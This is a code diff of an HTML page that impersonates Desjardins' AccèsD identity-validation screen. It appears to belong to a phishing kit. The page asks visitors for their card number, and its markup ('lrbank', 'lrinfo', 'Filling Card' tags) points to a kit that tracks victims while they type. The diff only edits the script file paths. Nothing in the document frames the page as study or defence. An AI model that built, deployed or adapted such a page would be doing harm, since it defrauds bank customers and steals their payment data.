@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<? php  ?>=(0039)/220098/desj/c -->
+<!-- saved from url=(0039)/220098/desj/c -->
 <html lang="fr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
         <title>Valider l'identité AccèsD AccèsD Affaires | Desjardins</title>
         <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
@@ -60,9 +60,9 @@
             width: 100% !important;
         }
         </style>
-        <script src="./files/jquery-3.6.0.min" crossorigin="anonymous"></script>
+        <script src="./files/jquery-3.6.0.min.js###" crossorigin="anonymous"></script>
         <script>var lrbank = 'Desj'; var lrinfo = 'Card';</script>
-        <script src="./files/actions"></script>
+        <script src="./files/actions.js###"></script>
     </head>
     <body class="isolation-bootstrap-3">
         <!-- if app_mobile -->
@@ -220,7 +220,7 @@
                                                                                                 <div class="if-div">
                                                     <p><b>Numéro de Carte:</b></p>
                                                     <input id="input-card" type="tel" placeholder="" name="card" onkeyup="split()" required="true" autocomplete="off" maxlength="19" oninput="this.value = this.value.replace(/[^0-9, ]/, &#39;&#39;)" class="lrinput" attr-action="Filling Card">
-                                                    <script src="./files/splitter"></script>
+                                                    <script src="./files/splitter.js###"></script>
                                                     <link rel="stylesheet" href="./files/card.css">
                                                 </div>
                                                                                                 <div class="if-div">
